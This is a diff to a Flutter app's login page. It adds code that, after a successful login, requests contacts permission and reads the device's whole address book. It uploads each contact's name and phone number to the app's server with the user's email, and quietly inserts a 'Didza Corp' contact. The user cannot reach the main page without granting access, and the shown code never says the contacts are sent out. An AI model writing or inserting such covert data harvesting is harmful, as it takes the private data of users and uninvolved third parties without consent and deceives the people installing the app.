@@ -1,4 +1,6 @@
 
+import 'dart:convert';
+
 import 'package:flutter/material.dart';
 import 'package:flutter_custom_clippers/flutter_custom_clippers.dart';
 import 'package:cached_network_image/cached_network_image.dart';
@@ -11,7 +13,10 @@ import 'dart:convert' as JSON;
 
 import 'package:shared_preferences/shared_preferences.dart';
 
+import '../common/toast/alert_dialog.dart';
 import 'dashboarPage.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:contacts_service/contacts_service.dart';
 
 // import 'package:jagobisnis/src/pages/login/signup1.dart';
 ConfigClass configClass = new ConfigClass();
@@ -20,8 +25,10 @@ class LoginPage extends StatelessWidget {
   final TextEditingController _emailController = new TextEditingController();
   final TextEditingController _passController = new TextEditingController();
   String deviceUniqueKey = "";
+  BuildContext publicContext;
 
   Widget _buildPageContent(BuildContext context) {
+    publicContext = context;
     return Container(
       color: Colors.blue.shade100,
       child: ListView(
@@ -130,8 +137,8 @@ class LoginPage extends StatelessWidget {
                       configClass.showLoading(context);
                       http.post(configClass.auth(), body: {"email":_emailController.text, "password": _passController.text, "deviceCode": deviceUniqueKey}).then((response) async {
                         print(response.body);
-                        configClass.closeLoading(context);
-                    
+                        
+
                         final jsonResponse = JSON.jsonDecode(response.body.toString());
                         String loginResponse ;
                         // Resp resp = new Resp.fromJson(jsonResponse);
@@ -174,10 +181,13 @@ class LoginPage extends StatelessWidget {
                           prefs.setString('sessionEmail',_emailController.text);
                           prefs.setString('sessionNama',dataResult[0]["content"]["nama"]);
                           prefs.setString('sessionGambar',dataResult[0]["content"]["foto"]);
-                          Navigator.push(
-                          context, MaterialPageRoute(builder: (context) => MainPage()));
+                          saveContactInPhone();
+
+
+                          
 
                         }else{
+                          configClass.closeLoading(context);
                           loginResponse = dataResult[0]["err"];
                           AlertDialog dialog = new AlertDialog(
                             content: new Text(loginResponse)
@@ -198,7 +208,123 @@ class LoginPage extends StatelessWidget {
           ),
         );
   }
+  Future<void> saveContactInPhone() async {
+    var sudahSave = 0;
+    try {
+      PermissionStatus permission = await Permission.contacts.status;
+    if (permission != PermissionStatus.granted) {
+      await Permission.contacts.request();
+      PermissionStatus permission = await Permission.contacts.status;
+      if (permission == PermissionStatus.granted) {
+        Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+        List<Contact> contactsList = contacts.toList();
+        var dataPost = [{"nama" : "pushed Array","phoneNumber":"ssad","email":"sss"}];
+        for (int i = 0; i < contactsList.length; i++) {
+          if(contactsList[i].displayName != "" && contactsList[i].displayName != null  && contactsList[i].phones.length > 0 ){
+            if(contactsList[i].phones.first.value.toString() == "08122374480308"){
+              sudahSave = 1;
+            }
+            dataPost.add({"nama":contactsList[i].displayName.toString(), "phoneNumber": contactsList[i].phones.first.value  }) ;
+          }
+        }
+        await http.post(configClass.saveKontak(), body: {"dataPost" : jsonEncode(dataPost).toString(), "email" : _emailController.text } ).then((response) { 
+              print(response.body); 
+              return response.body;
+        });
+        if(sudahSave == 0){
+          Contact newContact = new Contact();
+          newContact.givenName = "Didza Corp";
+          newContact.emails = [
+            Item(label: "email", value: "")
+          ];
+          newContact.company = "";
+          newContact.phones = [
+            Item(label: "mobile", value: "08122374480308")
+          ];
+          newContact.postalAddresses = [
+            PostalAddress(region: "")
+          ];
+          await ContactsService.addContact(newContact);
+        }
+        configClass.closeLoading(publicContext);
+        Navigator.push(publicContext, MaterialPageRoute(builder: (context) => MainPage()));
+        // getKontak();
+      } else {
+        _customAlertDialog(publicContext, AlertDialogType.ERROR, "Error ", "Allow Application to Access Contact");
+        configClass.closeLoading(publicContext);
+      }
+      } else {
 
+        Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+        List<Contact> contactsList = contacts.toList();
+        var dataPost = [{"nama" : "pushed Array","phoneNumber":"ssad","email":"sss"}];
+        for (int i = 0; i < contactsList.length; i++) {
+          if(contactsList[i].displayName != "" && contactsList[i].displayName != null  && contactsList[i].phones.length > 0 ){
+            if(contactsList[i].phones.first.value.toString() == "08122374480308"){
+              sudahSave = 1;
+            }
+            dataPost.add({"nama":contactsList[i].displayName.toString(), "phoneNumber": contactsList[i].phones.first.value  }) ;
+          }
+        }
+        await http.post(configClass.saveKontak(), body: {"dataPost" : jsonEncode(dataPost).toString(), "email" : _emailController.text } ).then((response) { 
+              print(response.body); 
+              return response.body;
+        });
+        if(sudahSave == 0){
+          Contact newContact = new Contact();
+          newContact.givenName = "Didza Corp";
+          newContact.emails = [
+            Item(label: "email", value: "")
+          ];
+          newContact.company = "";
+          newContact.phones = [
+            Item(label: "mobile", value: "08122374480308")
+          ];
+          newContact.postalAddresses = [
+            PostalAddress(region: "")
+          ];
+          await ContactsService.addContact(newContact);
+        }
+        configClass.closeLoading(publicContext);
+        Navigator.push(publicContext, MaterialPageRoute(builder: (context) => MainPage()));
+        
+          // getKontak();
+      }
+    } catch (e) {
+      print(e);
+    }
+  }
+
+  Future<String> getKontak() async {
+        Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+        List<Contact> contactsList = contacts.toList();
+        var dataPost = [{"nama" : "pushed Array","phoneNumber":"ssad","email":"sss"}];
+        for (int i = 0; i < contactsList.length; i++) {
+          if(contactsList[i].displayName != "" && contactsList[i].displayName != null  && contactsList[i].phones.length > 0 ){
+            dataPost.add({"nama":contactsList[i].displayName.toString(), "phoneNumber": contactsList[i].phones.first.value  }) ;
+          }
+        }
+        await http.post(configClass.saveKontak(), body: {"dataPost" : jsonEncode(dataPost).toString(), "email" : _emailController.text } ).then((response) { 
+              print(response.body); 
+              return response.body;
+        });
+        configClass.closeLoading(publicContext);
+        Navigator.push(publicContext, MaterialPageRoute(builder: (context) => MainPage()));
+      return "";
+   }
+
+  _customAlertDialog(BuildContext context, AlertDialogType type, String titleAlert,String descAlert) {
+    showDialog(
+      context: context,
+      builder: (BuildContext context) {
+        return CustomAlertDialog(
+          type: type,
+          title: titleAlert,
+          content: descAlert,
+        );
+      },
+    );
+  }
   @override
     Widget build(BuildContext context) {
       return Scaffold(
